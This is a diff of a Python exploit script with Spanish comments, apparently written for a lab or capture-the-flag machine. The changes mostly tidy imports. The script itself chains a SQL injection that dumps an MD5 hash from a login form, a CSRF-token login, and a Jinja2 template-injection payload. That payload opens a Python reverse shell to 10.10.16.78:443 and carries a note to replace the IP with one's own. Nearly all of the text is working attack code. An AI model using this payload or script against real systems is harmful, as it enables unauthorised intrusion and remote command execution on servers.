@@ -15,14 +15,14 @@ Este *Script* explota una inyección `SQL` para volcar un hash `MD5`, también s
 #!/usr/bin/python3
 
 from pwn import *
-import re
+from re import findall
 import signal
-import sys
+from sys import exit
 from requests import get,post,session
 
 def def_handler(sig,frame):
 	print("Saliendo")
-	sys.exit(1)
+	exit(1)
 signal.signal(signal.SIGINT, def_handler)
 
 class Exploit():
@@ -40,7 +40,7 @@ class Exploit():
 		p1 = log.progress("Hash")
 
 		r = post(self.__url+'/login', data=data_sqli)
-		hash_MD5 = re.findall(r'<h2 class="h4">Welcome (.*?)</h2>', r.text)[0]
+		hash_MD5 = findall(r'<h2 class="h4">Welcome (.*?)</h2>', r.text)[0]
 		
 		p1.success(hash_MD5[0:32])
 
@@ -50,7 +50,7 @@ class Exploit():
 		s.verify = False 
 
 		r = get(self.__subdomain+'/login')
-		csrf_token = re.findall(r'<input id="csrf_token" name="csrf_token" type="hidden" value="(.*?)">', r.text)[0]
+		csrf_token = findall(r'<input id="csrf_token" name="csrf_token" type="hidden" value="(.*?)">', r.text)[0]
 
 		data_login = {
 			'csrf_token': csrf_token,
@@ -62,7 +62,7 @@ class Exploit():
 		r = s.post(self.__subdomain+'/login', data=data_login)
 		# Cambiar IP por la vuestra
 		data_ssti = {
-			'name': r'''{{ cycler.__init__.__globals__.os.popen("""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.78\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'""").read() } }'''
+			'name': r'''{{cycler.__init__.__globals__.os.popen("""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.78\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'""").read()}}'''
 		}
 
 		r = s.post(self.__subdomain+'/settings', data=data_ssti)
